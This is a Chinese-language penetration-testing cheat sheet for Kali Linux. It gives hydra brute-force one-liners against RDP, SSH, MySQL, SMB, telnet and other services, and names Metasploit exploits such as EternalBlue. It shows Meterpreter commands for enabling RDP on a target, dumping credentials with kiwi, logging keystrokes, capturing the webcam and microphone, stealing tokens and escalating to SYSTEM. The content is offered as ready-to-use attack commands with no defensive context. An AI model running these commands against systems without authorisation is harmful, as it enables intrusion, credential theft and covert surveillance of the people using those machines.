
## kali

### Kali生成密码字典
```bash
crunch min_lenght max_lenght options -o file_save_path
```
### qemu img 转 vmdk
```cmd
.\qemu-img.exe convert -f qcow2 -O vmdk 'source_file' 'target_file.vmdk'
```
### vmdk 转 img
```cmd
.\qemu-img.exe convert -f vmdk -O qcow2 'source_file' 'target_file.img'
```
### MSF

* 永恒之蓝(ms17_010)
>port:  445
* MS15_034
>port:  HTTP
* MS12_020
>port:  3389
* 扫描存活主机(arp_sweep)

### 进入shell后是乱码
`chcp 65001`
### 开启靶机3389端口
`run getgui -e` \
`run port/windows/manage/enable_rdp`

### hydra

破解rdp(3389)：

`hydra -l administrator -P password.txt -V IP rdp`

破解mysql：

`hydra ip -L 用户名 -P pass.txt -V mysql`

破解ssh：

`hydra -L user.txt -P password.txt -e ns -vV IP ssh`

破解https：

`hydra -m /index.php -l muts -P pass.txt IP https`

破解teamspeak：

`hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak`

破解cisco：

`hydra -P pass.txt IP cisco`

`hydra -m cloud -P pass.txt IP cisco-enable`

破解smb：

`hydra -l administrator -P pass.txt IP smb`

破解pop3：

`hydra -l muts -P pass.txt my.pop3.mail pop3`

破解http-proxy：

`hydra -l admin -P pass.txt http-proxy://IP`

破解imap：

`hydra -L user.txt -p imap://ip PLAIN`

`hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN`

破解telnet

`hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V`

### Meterpreter
kiwi \ 
加载kiwi
`load kiwi`

检测所有凭证
`creds_all`


### Meterpreter命令用法
把当前会话挂到后台运行 \
`background` \
杀死后台meterpreter 脚本 \
`bgkill` \
列出正在运行的后台脚本 \
`bglist` \
执行一个meterpreter脚本作为后台线程 \
`bgrun` \
显示信息或控制活动频道 \
`channel` \
关闭一个频道 \
`close` \
分离Meterpreter会话(用于 http/https) \
`detach` \
禁用/启用 unicode 字符串的编码 \
`disable/enable_unicode_encoding` \
获取当前会话超时值 \
`get_timeouts`            
获取会话 GUID \
`guid`            
显示有关 Post 模块的信息 \
`info`          
加载一个或多个 Meterpreter 扩展                
`load` \
获取连接到会话的机器的 MSF ID \
`machine_id` \
运行存储在文件中的命令 \
`resource`           
执行一个 Meterpreter 脚本或 Post 模块 \
`run`       
(重新)协商会话上的 TLV 数据包加密 \
`secure`              
快速切换到另一个会话 \
`sessions`             
设置当前会话超时值 \
`set_timeouts`           
强制 Meterpreter安静，然后重新建立会话 \
`sleep`          
修改 SSL 证书验证设置 \
`ssl_verify`           


====================

Stdapi：文件系统命令

====================

下载文件或目录 \
`download` \
编辑文件 \
`edit`               
搜索文件 \
`search`                 
上传文件或目录 \
`upload`              

====================

Stdapi：网络命令

====================

显示主机 ARP 缓存 \
`arp` \
显示当前代理配置 \
`getproxy` \
显示界面 \
`ifconfig` \
显示接口 \
`ipconfig`      
显示网络连接 \
`netstat` \
将本地端口转发到远程服务 \
`portfwd`          
解析目标上的一组主机名 \
`resolve`              
查看和修改路由表 \
`route`         

====================

Stdapi：系统命令

====================

执行命令  \
`execute`     
获取一个或多个环境变量值 \
`getenv` \
获取当前进程标识符 \
`getpid` \
尝试启用当前进程可用的所有权限 \
`getprivs` \
获取服务器运行的用户的 SID \
`getid` \
获取服务器运行的用户 \
`getuid` \
终止进程 \
`kill` \
显示目标系统本地日期和时间 \
`localtime`     
按名称过滤进程\
`pgrep`  
按名称终止进程 \
`pkill`     
列出正在运行的进程 \
`ps`                  
重启远程计算机 \
`reboot`                 
修改远程注册表并与之交互 \
`reg`               
在远程机器上调用 RevertToSelf() \
`rev2self` \
放入系统命令 shell \
`shell`     
关闭远程计算机 \
`shutdown`        
尝试从目标进程窃取模拟令牌 \
`steal_token`              
暂停或恢复进程列表 \
`suspend` \
获取有关远程系统的信息，例如 OS \
`sysinfo`              

====================

Stdapi：用户界面命令

====================

列出所有可访问的桌面和窗口站 \
`enumdesktops` \
获取当前的meterpreter桌面 \
`getdesktop` \
返回远程用户空闲的秒数 \
`idletime`    
发送击键 \
`keyboard_send`          
发送按键事件 \
`keyevent`             
转储击键缓冲区 \
`keyscan_dump`      
开始捕获击键 \
`keyscan_start`               
停止捕获击键 \
`keyscan_stop`          
发送鼠标事件 \
`mouse`        
实时观看远程用户桌面 \
`screenshare` \
抓取交互式桌面的截图 \
`screenshot` \
更改meterpreters当前桌面 \
`setdesktop`    
控制一些用户界面组件 \
`uictl`                

====================

Stdapi：网络摄像头命令：

====================

从默认麦克风录制音频 X 秒 \
`record_mic` \
开始视频聊天 \
`webcam_chat`             
列出网络摄像头 \
`webcam_list`             
从指定的网络摄像头拍摄快照 \
`webcam_snap`         
从指定的网络摄像头播放视频流 \
`webcam_stream`        

在目标系统上播放波形音频文件 (.wav) \
`play`             

尝试将您的权限提升到本地系统的权限 \
`getsystem`      


































